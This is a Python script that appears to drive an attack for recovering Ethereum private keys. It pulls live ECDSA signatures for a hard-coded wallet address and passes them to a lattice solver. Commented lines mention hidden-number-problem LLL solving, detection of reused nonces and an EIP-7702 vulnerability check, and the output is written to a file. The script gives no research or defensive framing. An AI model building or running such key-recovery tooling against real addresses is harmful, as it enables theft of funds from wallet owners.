import os
import botr
import bottest2
import botmul
import hook
import hookctl

def get_lists():
    try:
        with open("tr.txt", "r") as f:
            # .read().splitlines() automatically handles newlines 
            # and prevents the "one giant string" error
            content = f.read().splitlines()
            
            # This cleans each hash and removes empty lines
            wordsList = [line.strip() for line in content if line.strip()]
            return wordsList
    except FileNotFoundError:
        print("Error: tr.txt not found.")
        return []

def main():
    # tokes = get_lists()
    # print(len(tokes))
    tokens = []
    # for toke in tokes:
    #     # print(toke)
    #     result = {}
    #     result = bottest2.extract_params_type2(toke)
    #     if result["type"] == 2:
    #         tokens.append((result["e"], result["r"], result["s"]))
    data = 0
    # data = botmul.solve_hnp_with_lll(tokens[0:-1], 8)    
    # print(type(data))
    # tokens = hook.get_pro_signatures(tokes)
    # print((tokens))
    # print(hookctl.get_transaction_data("0xc48518cad067dd8e27c56ce36a2cc9f776f26762710f584f0b0f69addf198901"))
    myAddress = "0x264bd8291fAE1D75DB2c5F573b07faA6715997B5"
    # "0xf584F8728B874a6a5c7A8d4d387C9aae9172D621"
    # print(hook.check_for_guardian(myAddress))
    tokens = hook.get_live_signatures(myAddress)
    print(tokens[:-2])
    print(len(tokens))
    # re = hookctl.extract_data("0x17b6eced32f23a88ba165039ff85b35062db3e8997aba2d937bf1c6a9f4c4484")
    # print(re)
    # result = hookctl.fast_lattice_solve(tokens, myAddress, 128)
    result = hookctl.solve_lattice(tokens, myAddress)
    print(len(result))
    # txs = hook.get_live_txs(myAddress)
    # print(tokens)
    # print(hook.check_eip7702_vulnerability(txs, myAddress))
    # data = hook.solve_lattice_shifted(tokens, myAddress)
    with open("1.txt", "w") as file:
        file.write((result))
    # print("finishsed")
    # results = []
    # results = botr.find_shared_r(tokes)
    # print(results)

main()